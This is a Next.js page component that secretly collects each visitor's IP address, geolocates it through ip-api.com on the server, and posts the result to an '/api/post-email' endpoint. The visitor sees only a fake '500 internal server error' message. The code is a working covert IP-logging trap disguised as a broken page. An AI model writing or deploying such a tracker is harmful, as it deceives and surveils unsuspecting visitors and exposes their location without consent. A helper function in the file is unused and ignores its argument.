import axios from 'axios';
import { GetServerSidePropsContext, NextPage } from 'next';
import { Inter } from 'next/font/google'
import { useEffect } from 'react';

const inter = Inter({ subsets: ['latin'] })

const postEmail = async (data: any) => {
  const res = await axios.post("/api/post-email")
  return res.data  
    
}


interface HomeProps {
  location: any
}

const Home: NextPage<HomeProps> = ({location}) => {

  useEffect(() => {
    if(!location) return 

    const sendEmail = async () => {
      const response = await axios.post("/api/post-email", location)
      console.log(response)
    }

    sendEmail()

  }, [location])

  
  return (
    <main className={`${inter.className} min-h-screen flex justify-center items-center`}>
    <h1 className='text-lg'><i>500 internal server error</i></h1>
    </main>
    
  )
}

export default Home


export async function getServerSideProps(context: GetServerSidePropsContext) {
  const ip = context.req.headers['x-forwarded-for'] || context.req.connection.remoteAddress;

  const response = await fetch(`http://ip-api.com/json/${ip}`);
  const data = await response.json();

  return {
    props: {
      location: data,
    }, 
  }

}